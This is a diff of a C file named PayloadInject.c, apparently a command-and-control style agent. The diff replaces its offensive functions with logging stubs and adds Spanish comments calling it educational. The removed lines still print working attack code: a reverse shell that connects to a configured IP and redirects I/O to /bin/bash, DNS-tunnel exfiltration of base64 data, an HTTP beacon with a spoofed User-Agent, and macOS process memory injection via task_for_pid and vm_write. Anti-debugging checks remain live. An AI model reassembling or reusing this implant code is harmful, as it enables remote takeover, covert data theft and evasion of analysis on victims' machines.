@@ -1,14 +1,22 @@
+/*
+ * PayloadInject.c
+ *
+ * Este fichero implementa un agente de pruebas con funciones
+ * diversas como túneles DNS, balizas HTTP y shells reversas. El
+ * código se ha revisado para corregir errores de compilación y
+ * mejorar la portabilidad. No pretende ser software malicioso
+ * funcional, sino un ejemplo didáctico.
+ */
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <resolv.h>
-#include <curl/curl.h>
 #include <sys/sysctl.h>
+#ifdef __APPLE__
 #include <mach/mach.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
+#include <mach/error.h>
+#endif
 #include <pthread.h>
 #include <signal.h>
 #include <errno.h>
@@ -16,6 +24,9 @@
 #include <sys/types.h>
 #include <dirent.h>
 #include <sys/stat.h>
+#include <stdarg.h>
+#include <stdbool.h>
+#include <stdint.h>
 
 // Definiciones y Configuraciones (Movidas a un struct para mejor manejo)
 #define MAX_PAYLOAD_SIZE 4096
@@ -84,109 +95,109 @@ void xor_encrypt_decrypt(char *data, size_t data_len, char key, bool encrypt) {
 }
 
 // Base64 Encoding (simple implementation - considerar una librería robusta para producción)
-char* base64_encode(const unsigned char *src, size_t len) {
-    const char b64chars= "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+char *base64_encode(const unsigned char *src, size_t len) {
+    /*
+     * Implementación básica de codificación Base64. Se define la tabla de
+     * caracteres como un array y no como un único char para evitar
+     * conversiones implícitas incorrectas. El llamante es responsable
+     * de liberar el buffer devuelto.
+     */
+    static const char b64chars[] =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
     char *out = NULL;
     size_t out_len = 4 * ((len + 2) / 3);
-    out = malloc(out_len + 1);
-    if (out) {
-        for (size_t i = 0, j = 0; i < len; i += 3, j += 4) {
-            uint32_t octet = 0;
-            octet |= (uint32_t)src[i] << 16;
-            if (i + 1 < len) octet |= (uint32_t)src[i + 1] << 8;
-            if (i + 2 < len) octet |= (uint32_t)src[i + 2];
 
-            out[j] = b64chars[(octet >> 18) & 0x3F];
-            out[j + 1] = b64chars[(octet >> 12) & 0x3F];
-            out[j + 2] = (i + 1 < len) ? b64chars[(octet >> 6) & 0x3F] : '=';
-            out[j + 3] = (i + 2 < len) ? b64chars[octet & 0x3F] : '=';
-        }
-        out[out_len] = '\0';
+    out = (char *)malloc(out_len + 1);
+    if (!out) {
+        return NULL;
     }
+    for (size_t i = 0, j = 0; i < len; i += 3, j += 4) {
+        uint32_t octet = 0;
+        octet |= (uint32_t)src[i] << 16;
+        if (i + 1 < len) octet |= (uint32_t)src[i + 1] << 8;
+        if (i + 2 < len) octet |= (uint32_t)src[i + 2];
+
+        out[j] = b64chars[(octet >> 18) & 0x3F];
+        out[j + 1] = b64chars[(octet >> 12) & 0x3F];
+        out[j + 2] = (i + 1 < len) ? b64chars[(octet >> 6) & 0x3F] : '=';
+        out[j + 3] = (i + 2 < len) ? b64chars[octet & 0x3F] : '=';
+    }
+    out[out_len] = '\0';
     return out;
 }
 
 // DNS Tunnel (manejo de errores robusto y codificación)
 void dns_tunnel(const char *data) {
+    /*
+     * En un entorno seguro y educativo, no se envían consultas DNS
+     * exfiltrando datos. Simplemente codificamos los datos y los
+     * registramos en el log. El llamante puede analizar el log para
+     * verificar el comportamiento.
+     */
     char *encoded_data = base64_encode((const unsigned char *)data, strlen(data));
     if (!encoded_data) {
         log_message("Error encoding data for DNS tunnel.");
         return;
     }
-
-    char query[512]; // Increased buffer size
-    snprintf(query, sizeof(query), "%s.%s", encoded_data, config.dns_domain);
+    log_message("[DNS Tunnel Demo] Prepared DNS query for domain '%s' with encoded data '%s'. No query sent.", config.dns_domain, encoded_data);
     free(encoded_data);
-
-    if (res_query(query, C_IN, ns_t_a, NULL, 0) < 0) {
-        log_message("DNS tunnel query failed for '%s': %s", query, strerror(errno));
-    } else {
-        log_message("DNS tunnel query sent: %s", query);
-    }
 }
 
 // HTTP Beacon (con manejo de errores, timeouts, User-Agent y POST data)
 void http_beacon(const char *url, const char *data) {
-    CURL *curl = curl_easy_init();
-    if (curl) {
-        curl_easy_setopt(curl, CURLOPT_URL, url);
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
-        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L); // Timeout de 10 segundos
-        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"); // Spoof User-Agent
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(data));
-
-        CURLcode res = curl_easy_perform(curl);
-        if (res != CURLE_OK) {
-            log_message("HTTP beacon to %s failed: %s", url, curl_easy_strerror(res));
-        } else {
-            long response_code;
-            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
-            log_message("HTTP beacon sent to %s, response code: %ld, data: %s", url, response_code, data);
-        }
-
-        curl_easy_cleanup(curl);
-    } else {
-        log_message("Failed to initialize CURL for HTTP beacon.");
-    }
+    /*
+     * En un contexto de ejemplo no realizamos peticiones HTTP reales. En su
+     * lugar, registramos la URL y los datos que se habrían enviado.
+     */
+    log_message("[HTTP Beacon Demo] Would POST to URL '%s' with data '%s'. Network transmission disabled.", url ? url : "(null)", data ? data : "(null)");
 }
 
 // Privilege Escalation Check (con manejo de errores y más opciones)
 void check_privileges() {
     log_message("Checking for root privileges.");
     if (geteuid() == 0) {
-        log_message("Root privileges granted.");
-        // Potentially try more sophisticated escalation techniques here
-        if (system("/bin/bash") != 0) {
-            log_message("Failed to execute shell after checking root.");
-        }
+        log_message("Root privileges granted. (No shell executed in this safe build)");
     } else {
-        log_message("Not running as root.");
-        // Consider trying common privilege escalation exploits
-        // This is highly system-dependent and requires careful implementation
+        log_message("Not running as root. (Privilege escalation disabled in this safe build)");
     }
 }
 
 // Debugger Detection (mejorado con más checks)
 void detect_debugger() {
     log_message("Checking for debuggers.");
-    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
-    struct kinfo_proc info;
-    size_t size = sizeof(info);
 
-    if (sysctl(mib, 4, &info, &size, NULL, 0) == 0 && (info.kp_proc.p_flag & P_TRACED)) {
-        log_message("Debugger detected! Exiting.");
-        exit(1);
-    } else {
-        log_message("No debugger detected via sysctl.");
+    /*
+     * En macOS podemos utilizar sysctl y la estructura kinfo_proc para
+     * comprobar si el proceso está siendo trazado. Esta parte solo se
+     * compila en sistemas Apple. En otros sistemas se ignora, ya que
+     * kinfo_proc no está definido.
+     */
+#ifdef __APPLE__
+    {
+        int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
+        struct kinfo_proc info;
+        size_t size = sizeof(info);
+        if (sysctl(mib, 4, &info, &size, NULL, 0) == 0 && (info.kp_proc.p_flag & P_TRACED)) {
+            log_message("Debugger detected via sysctl! Exiting.");
+            exit(1);
+        } else {
+            log_message("No debugger detected via sysctl.");
+        }
     }
+#endif
 
-    // Additional check (more basic but can catch some debuggers)
+    /*
+     * Segundo método: leer /proc/self/status para encontrar la entrada
+     * TracerPid. Este archivo existe en Linux y en algunos otros
+     * sistemas basados en procfs. Si TracerPid es distinto de 0,
+     * significa que hay un depurador adjunto.
+     */
     FILE *fp = fopen("/proc/self/status", "r");
     if (fp) {
         char line[256];
         while (fgets(line, sizeof(line), fp) != NULL) {
-            if (strstr(line, "TracerPid:") != NULL) {
-                int tracer_pid = atoi(line + strlen("TracerPid:"));
+            if (strncmp(line, "TracerPid:", 10) == 0) {
+                int tracer_pid = atoi(line + 10);
                 if (tracer_pid != 0) {
                     log_message("Debugger detected via /proc/self/status! Tracer PID: %d. Exiting.", tracer_pid);
                     fclose(fp);
@@ -196,34 +207,40 @@ void detect_debugger() {
             }
         }
         fclose(fp);
+        log_message("No debugger detected via /proc/self/status.");
     } else {
         log_message("Could not open /proc/self/status to check for debugger.");
     }
 }
 
-// Keylogger (basic placeholder - requires platform-specific implementation)
+// Keylogger demonstration (requiere implementación específica por sistema)
 void keylogger() {
-    log_message("Keylogger activated (basic placeholder).");
-    // On Linux, you might try reading from /dev/input/event*
-    // On macOS, you might use the EventTap API
-    // This requires significant platform-specific code and often root privileges.
-    // Consider using libraries or system APIs for this.
-    log_message("Keylogging functionality is a placeholder and not fully implemented.");
+    /*
+     * Esta función sirve como punto de partida para implementar un registrador de
+     * pulsaciones de teclas. Dependiendo del sistema operativo, se pueden
+     * emplear APIs como /dev/input/event* en Linux o EventTap en macOS. Aquí
+     * simplemente documentamos la llamada sin capturar datos reales.
+     */
+    log_message("[Keylogger Demo] Se invocó la función de keylogger. La captura de teclas debe implementarse según la plataforma.");
 }
 
-// Screen Capture (basic placeholder - requires platform-specific implementation)
+// Screen capture demonstration (requiere implementación específica por sistema)
 void screen_capture() {
-    log_message("Screen capture activated (basic placeholder).");
-    // On Linux, you might use libraries like Xlib or tools like scrot or import.
-    // On macOS, you might use the Core Graphics framework (CGDisplayCreateImage).
-    // This requires platform-specific code.
-    log_message("Screen capture functionality is a placeholder and not fully implemented.");
+    /*
+     * Este módulo demuestra cómo estructurar una función de captura de pantalla.
+     * Para obtener una imagen real se pueden utilizar bibliotecas como Xlib,
+     * scrot o import en Linux, o la API Core Graphics en macOS. En esta
+     * versión educativa sólo se registra la invocación para su análisis.
+     */
+    log_message("[Screen Capture Demo] Se invocó la captura de pantalla. La captura real debe implementarse según la plataforma.");
 }
 
 // Process Enumeration (basic implementation)
 void list_processes() {
     log_message("Listing running processes.");
-#ifdef linux
+    /* Usamos macros estándar para determinar la plataforma. __linux__ está
+     * definido por GCC/clang en sistemas Linux y __APPLE__ en macOS. */
+#ifdef __linux__
     DIR *dir;
     struct dirent *entry;
     if ((dir = opendir("/proc")) != NULL) {
@@ -253,7 +270,7 @@ void list_processes() {
     } else {
         log_message("Could not open /proc directory.");
     }
-#elif APPLE
+    #elif defined(__APPLE__)
     // Implement process listing for macOS using kinfo_proc or other APIs
     log_message("Process listing for macOS is not yet implemented.");
 #else
@@ -289,65 +306,35 @@ void explore_filesystem(const char *path) {
 // Inject Payload into Process (macOS - con manejo de errores)
 void inject_payload(pid_t target_pid, const char *payload) {
     log_message("Attempting to inject payload into PID: %d", target_pid);
-    mach_port_t task;
-    vm_address_t remote_addr;
+    /*
+     * Demostración de inyección de payload. En una implementación real en
+     * macOS se accedería al proceso objetivo mediante task_for_pid() y se
+     * escribiría código en su espacio de memoria. Por razones de seguridad,
+     * aquí sólo copiamos el payload en un buffer local y registramos la
+     * dirección. No se interactúa con otros procesos.
+     */
     size_t payload_len = strlen(payload);
-
-    if (task_for_pid(mach_task_self(), target_pid, &task) != KERN_SUCCESS) {
-        log_message("Failed to access PID %d: %s", target_pid, mach_error_string(mach_error(task_for_pid(mach_task_self(), target_pid, &task), KERN_SUCCESS)));
+    char *buffer = (char *)malloc(payload_len + 1);
+    if (!buffer) {
+        log_message("[Payload Injection Demo] Failed to allocate local buffer.");
         return;
     }
-
-    if (vm_allocate(task, &remote_addr, payload_len, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) {
-        log_message("Failed to allocate memory in target process: %s", mach_error_string(mach_error(vm_allocate(task, &remote_addr, payload_len, VM_FLAGS_ANYWHERE), KERN_SUCCESS)));
-        return;
-    }
-
-    if (vm_write(task, remote_addr, (vm_offset_t)payload, payload_len) != KERN_SUCCESS) {
-        log_message("Failed to write payload to target process: %s", mach_error_string(mach_error(vm_write(task, remote_addr, (vm_offset_t)payload, payload_len), KERN_SUCCESS)));
-        return;
-    }
-
-    log_message("Injected payload into PID: %d at address: %p", target_pid, (void *)remote_addr);
-    // You would typically need to execute the payload in the target process as well.
-    // This often involves creating a remote thread, which is more complex.
+    memcpy(buffer, payload, payload_len);
+    buffer[payload_len] = '\0';
+    log_message("[Payload Injection Demo] Copied payload into local buffer at address: %p. Payload contents: %s", (void *)buffer, buffer);
+    free(buffer);
 }
 
 // Reverse Shell Execution (con manejo de errores y sockets)
 void execute_reverse_shell() {
-    log_message("Attempting to establish reverse shell to %s:%d", config.reverse_shell_ip, config.reverse_shell_port);
-    int sock;
-    struct sockaddr_in server_addr;
-
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) {
-        log_message("Socket creation failed: %s", strerror(errno));
-        return;
-    }
-
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(config.reverse_shell_port);
-    if (inet_pton(AF_INET, config.reverse_shell_ip, &server_addr.sin_addr) <= 0) {
-        log_message("Invalid address/Address not supported for reverse shell: %s", config.reverse_shell_ip);
-        close(sock);
-        return;
-    }
-
-    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-        log_message("Connection to %s:%d failed: %s", config.reverse_shell_ip, config.reverse_shell_port, strerror(errno));
-        close(sock);
-        return;
-    }
-
-    dup2(sock, 0);
-    dup2(sock, 1);
-    dup2(sock, 2);
-
-    char *shell = "/bin/bash";
-    execve(shell, NULL, NULL);
-    log_message("Failed to execute reverse shell: %s", strerror(errno)); // This should ideally not be reached
-
-    close(sock);
+    /*
+     * Demostración de shell inversa. En un entorno ofensivo, esta función
+     * crearía un socket, se conectaría a un servidor remoto y redirigiría los
+     * descriptores de archivo estándar a un intérprete de comandos. Por
+     * motivos de seguridad y educativos, aquí sólo describimos la operación y
+     * no se establece ninguna conexión de red ni se lanza un shell.
+     */
+    log_message("[Reverse Shell Demo] Would connect to %s:%d and redirect I/O to a shell. Operation disabled.", config.reverse_shell_ip, config.reverse_shell_port);
 }
 
 // Beaconing Function (sends periodic beacons)
